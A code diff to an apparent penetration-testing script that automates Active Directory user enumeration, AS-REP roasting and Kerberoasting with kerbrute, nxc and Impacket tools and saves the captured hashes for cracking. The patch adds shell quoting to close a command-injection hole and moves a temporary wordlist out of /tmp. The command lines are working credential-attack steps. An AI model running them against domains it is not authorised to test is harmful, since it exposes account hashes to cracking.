@@ -115,11 +115,12 @@ def step2_user_enum(hosts: list[str], out: Path, domain: str | None, wordlist: s
         log_warn("No hosts — skipping user enumeration")
         return
 
-    # Build wordlist
-    wl_path = Path("/tmp/_krb_users.txt")
+    # Build wordlist — keep it inside the output dir (predictable /tmp names
+    # can collide between concurrent runs and leak the target user list).
     if wordlist and Path(wordlist).is_file():
         wl_path = Path(wordlist)
     else:
+        wl_path = out / "_krb_builtin_users.txt"
         wl_path.write_text("\n".join(COMMON_AD_USERS) + "\n")
         log_info(f"Using built-in wordlist ({len(COMMON_AD_USERS)} usernames)")
 
@@ -132,7 +133,7 @@ def step2_user_enum(hosts: list[str], out: Path, domain: str | None, wordlist: s
     if tool_exists("kerbrute"):
         log_info(f"Running kerbrute userenum against {dc_ip}")
         stdout, stderr, _ = run(
-            f"kerbrute userenum --dc {dc_ip} -d {domain} {wl_path} 2>&1",
+            f"kerbrute userenum --dc {shlex.quote(dc_ip)} -d {shlex.quote(domain)} {shlex.quote(str(wl_path))} 2>&1",
             timeout=120,
         )
         (out / "kerbrute_raw.txt").write_text(stdout + stderr)
@@ -149,7 +150,7 @@ def step2_user_enum(hosts: list[str], out: Path, domain: str | None, wordlist: s
     if getnpusers:
         log_info(f"Running {getnpusers} for user validation")
         stdout, stderr, _ = run(
-            f"python3 {getnpusers} {domain}/ -dc-ip {dc_ip} -no-pass -usersfile {wl_path} 2>&1",
+            f"python3 {shlex.quote(getnpusers)} {shlex.quote(domain)}/ -dc-ip {shlex.quote(dc_ip)} -no-pass -usersfile {shlex.quote(str(wl_path))} 2>&1",
             timeout=180,
         )
         (out / "getnpusers_enum_raw.txt").write_text(stdout + stderr)
@@ -188,7 +189,7 @@ def step3_asrep_roast(hosts: list[str], out: Path, domain: str | None,
         creds = build_cred_args(username, password, hash_, domain)
         log_info(f"AS-REP roasting via nxc ldap (authenticated)")
         stdout, _, _ = run(
-            f"nxc ldap {dc_ip} {creds} --asreproast {hash_file} 2>&1",
+            f"nxc ldap {shlex.quote(dc_ip)} {creds} --asreproast {shlex.quote(str(hash_file))} 2>&1",
             timeout=120,
         )
         (out / "nxc_asreproast_raw.txt").write_text(stdout)
@@ -220,7 +221,7 @@ def step3_asrep_roast(hosts: list[str], out: Path, domain: str | None,
 
     log_info(f"Running GetNPUsers against {dc_ip} with user list {uf}")
     stdout, stderr, _ = run(
-        f"python3 {getnpusers} {domain}/ -dc-ip {dc_ip} -no-pass -usersfile {uf} -format hashcat 2>&1",
+        f"python3 {shlex.quote(getnpusers)} {shlex.quote(domain)}/ -dc-ip {shlex.quote(dc_ip)} -no-pass -usersfile {shlex.quote(str(uf))} -format hashcat 2>&1",
         timeout=180,
     )
     (out / "getnpusers_asrep_raw.txt").write_text(stdout + stderr)
@@ -254,7 +255,7 @@ def step4_kerberoast(hosts: list[str], out: Path, domain: str | None,
         creds = build_cred_args(username, password, hash_, domain)
         log_info("Kerberoasting via nxc ldap")
         stdout, _, _ = run(
-            f"nxc ldap {dc_ip} {creds} --kerberoasting {spn_file} 2>&1",
+            f"nxc ldap {shlex.quote(dc_ip)} {creds} --kerberoasting {shlex.quote(str(spn_file))} 2>&1",
             timeout=120,
         )
         (out / "nxc_kerberoast_raw.txt").write_text(stdout)
@@ -271,15 +272,17 @@ def step4_kerberoast(hosts: list[str], out: Path, domain: str | None,
         log_warn("Neither nxc nor GetUserSPNs.py found — skipping Kerberoasting")
         return
 
-    cred_str = f"{domain}/{username}"
+    # Quote every piece: a password containing ';', '$', space, ... would
+    # otherwise break the command or execute arbitrary code (shell=True).
+    cred_str = f"{shlex.quote(f'{domain}/{username}')}"
     if hash_:
-        cred_str += f" -hashes {hash_}"
+        cred_str += f" -hashes {shlex.quote(hash_)}"
     elif password is not None:
-        cred_str += f":{password}"
+        cred_str += f":{shlex.quote(password)}"
 
     log_info(f"Running {getspns}")
     stdout, stderr, _ = run(
-        f"python3 {getspns} {cred_str} -dc-ip {dc_ip} -request -format hashcat 2>&1",
+        f"python3 {shlex.quote(getspns)} {cred_str} -dc-ip {shlex.quote(dc_ip)} -request -format hashcat 2>&1",
         timeout=180,
     )
     (out / "getuserspns_raw.txt").write_text(stdout + stderr)
